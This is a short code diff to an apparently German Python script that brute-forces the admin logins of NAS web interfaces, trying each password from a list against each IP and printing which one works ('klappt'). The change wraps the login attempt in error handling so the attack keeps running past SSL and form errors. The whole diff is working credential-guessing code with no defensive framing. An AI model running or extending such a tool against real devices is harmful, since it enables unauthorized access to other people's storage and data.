@@ -22,12 +22,15 @@ def force(nas_list):
             print("Versuche IP "+ip)
             for pwd in pwd_list:
                 browser = mechanicalsoup.StatefulBrowser()
-                browser.open("http://"+ip+":"+port)
-                browser.get_current_page()
-                browser.select_form()
-                browser["username"]="admin"
-                browser["passwd"]=pwd
-                response = browser.submit_selected()
+                try:
+                    browser.open("http://"+ip+":"+port)
+                    browser.get_current_page()
+                    browser.select_form()
+                    browser["username"]="admin"
+                    browser["passwd"]=pwd
+                    response = browser.submit_selected()
+                except (mechanicalsoup.utils.LinkNotFoundError, requests.exceptions.SSLError) as e:
+                    continue
 
                 if '"success" : true' in str(response.text):
                     print ("Passwort '"+pwd+"' klappt fuer IP "+ip)
